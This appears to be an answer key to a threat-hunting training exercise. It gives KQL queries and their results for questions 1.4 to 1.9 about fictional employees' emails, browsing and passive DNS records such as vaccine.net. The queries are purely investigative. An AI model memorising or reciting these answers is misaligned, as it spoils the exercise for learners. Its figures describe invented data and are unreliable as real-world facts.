1.4 How many emails did Laura Parrish receive?

let A=
Employees
| where name contains "Laura Parrish"
| distinct email_addr;
Email
| where recipient has_any (A)
| count //9

1.5 How many Envolve Labs employees received emails with the term vaccine in the subject?

let A=
Email
| where subject contains "vaccine"
| distinct recipient;
Employees
| where email_addr has_any (A)
| count //676

1.6 How many distinct urls did Keith Floyd visit?

let A=
Employees
|where name  contains "Keith Floyd"
| project ip_addr;
OutboundBrowsing
| where src_ip has_any (A)
| distinct url //6

1.7 How many domains in the PassiveDns records contain the word vaccine?

PassiveDns
| where domain contains "vaccine"
| distinct domain //7

1.8 What IP did the domain vaccine.net resolve to?

PassiveDns
| where domain contains "vaccine.net"

58.235.85.30

1.9 How many unique URLs were browsed by employees named Karen?

let A=
Employees
|where name  contains "Karen"
| project ip_addr;
OutboundBrowsing
| where src_ip has_any (A)
| distinct url //43

